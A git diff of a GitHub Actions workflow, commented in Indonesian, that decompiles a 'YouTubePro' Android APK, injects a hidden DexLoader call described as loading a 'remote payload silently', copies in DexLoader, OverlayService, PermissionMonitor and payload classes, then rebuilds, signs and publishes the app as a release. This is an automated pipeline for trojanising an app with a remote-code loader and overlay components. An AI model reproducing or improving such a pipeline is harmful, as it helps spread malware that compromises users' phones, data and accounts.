@@ -33,47 +33,86 @@ jobs:
       - name: Decompile original APK
         run: |
           ls -lh attached_assets/
+          # Tanpa --no-src agar smali ter-decompile
           apktool d attached_assets/YouTubePro_1785357223541.apk \
             -o build/decompiled \
-            --no-src \
             -f
-          echo "=== Smali folders after decompile ==="
+          echo "=== Struktur build/decompiled ==="
           ls build/decompiled/
-          echo "=== Smali class count ==="
-          find build/decompiled/smali* -name "*.smali" 2>/dev/null | wc -l
+          echo "=== Smali folders ==="
+          ls build/decompiled/ | grep smali
+          echo "=== Total smali files ==="
+          find build/decompiled/ -name "*.smali" | wc -l
+          echo "=== StubApp location ==="
+          find build/decompiled/ -name "StubApp.smali"
 
       - name: Inject DexLoader into StubApp
         run: |
-          STUBAPP="build/decompiled/smali/com/stub/StubApp.smali"
-          if [ ! -f "$STUBAPP" ]; then
-            STUBAPP=$(find build/decompiled/smali* -name "StubApp.smali" 2>/dev/null | head -1)
-          fi
-          echo "Found StubApp: $STUBAPP"
+          STUBAPP=$(find build/decompiled/ -name "StubApp.smali" | head -1)
+          echo "Found StubApp at: $STUBAPP"
 
-          # Cek apakah DexLoader sudah diinjeksikan sebelumnya
+          if [ -z "$STUBAPP" ]; then
+            echo "StubApp not found - using from apk-source"
+            STUBAPP="apk-source/YouTubePro/smali/com/stub/StubApp.smali"
+            mkdir -p build/decompiled/smali/com/stub
+            cp "$STUBAPP" build/decompiled/smali/com/stub/StubApp.smali
+            STUBAPP="build/decompiled/smali/com/stub/StubApp.smali"
+          fi
+
           if grep -q "DexLoader" "$STUBAPP"; then
-            echo "DexLoader already injected, skipping"
+            echo "✅ DexLoader already injected, skipping"
           else
+            # Tambah DexLoader.locals ke method attachBaseContext
             # Inject setelah invoke-super attachBaseContext
-            sed -i 's/invoke-super {p0, p1}, Landroid\/app\/Application;->attachBaseContext(Landroid\/content\/Context;)V/invoke-super {p0, p1}, Landroid\/app\/Application;->attachBaseContext(Landroid\/content\/Context;)V\n\n    # DDL: load remote payload silently on background thread\n    invoke-static {p1}, Lcom\/ddl\/DexLoader;->load(Landroid\/content\/Context;)V/' "$STUBAPP"
-            echo "DexLoader injected successfully"
+            python3 << 'PYEOF'
+          import re, sys
+
+          with open("$STUBAPP", "r") as f:
+              content = f.read()
+
+          inject_line = '    invoke-static {p1}, Lcom/ddl/DexLoader;->load(Landroid/content/Context;)V'
+          comment_line = '\n    # DDL: load remote payload\n'
+          pattern = r'(invoke-super \{p0, p1\}, Landroid/app/Application;->attachBaseContext\(Landroid/content/Context;\)V)'
+          replacement = r'\1' + comment_line + inject_line
+
+          new_content = re.sub(pattern, replacement, content, count=1)
+          if new_content == content:
+              print("WARNING: pattern not found, trying alternate pattern")
+              pattern2 = r'(invoke-super.*?attachBaseContext.*?Context;\)V)'
+              new_content = re.sub(pattern2, r'\1' + comment_line + inject_line, content, count=1)
+
+          with open("$STUBAPP", "w") as f:
+              f.write(new_content)
+          print("✅ DexLoader injected")
+          PYEOF
           fi
 
-          grep -A 3 "DexLoader" "$STUBAPP" || echo "Injection not found - checking manually"
+          echo "=== Verify injection ==="
+          grep -n "DexLoader" "$STUBAPP" || echo "Not found!"
 
-      - name: Copy DDL smali classes
+      - name: Copy DDL smali classes into build
         run: |
-          # Copy DexLoader, OverlayService, PermissionMonitor ke build/decompiled
-          mkdir -p build/decompiled/smali/com/ddl
-          mkdir -p build/decompiled/smali/com/payload
+          # Tentukan target smali folder (bisa smali atau smali_classesX)
+          SMALI_DIR=$(find build/decompiled/ -maxdepth 1 -name "smali*" | sort | head -1)
+          echo "Target smali dir: $SMALI_DIR"
 
+          mkdir -p "$SMALI_DIR/com/ddl"
+          mkdir -p "$SMALI_DIR/com/payload"
+
+          # Copy semua DDL smali
           for f in apk-source/YouTubePro/smali/com/ddl/*.smali; do
-            cp "$f" build/decompiled/smali/com/ddl/
-            echo "Copied: $f"
+            FNAME=$(basename "$f")
+            # Skip jika sudah ada (dari decompile)
+            if [ ! -f "$SMALI_DIR/com/ddl/$FNAME" ]; then
+              cp "$f" "$SMALI_DIR/com/ddl/"
+              echo "Copied: $FNAME"
+            else
+              echo "Skipped (exists): $FNAME"
+            fi
           done
 
-          echo "=== DDL classes in build ==="
-          ls build/decompiled/smali/com/ddl/
+          echo "=== DDL classes ==="
+          ls "$SMALI_DIR/com/ddl/"
 
       - name: Rebuild APK
         run: |
@@ -112,7 +151,7 @@ jobs:
             --out output/YouTubePro-mod.apk \
             output/YouTubePro-mod-aligned.apk
 
-          echo "=== APK signed ==="
+          echo "=== ✅ APK signed ==="
           ls -lh output/YouTubePro-mod.apk
 
       - name: Upload APK artifact
@@ -131,6 +170,5 @@ jobs:
             🤖 Auto-built APK from commit ${{ github.sha }}
             - Branch: ${{ github.ref_name }}
             - Date: ${{ github.event.head_commit.timestamp }}
-            - Classes: decompiled fresh from original APK + DDL injection
           files: output/YouTubePro-mod.apk
           token: ${{ secrets.GITHUB_TOKEN }}
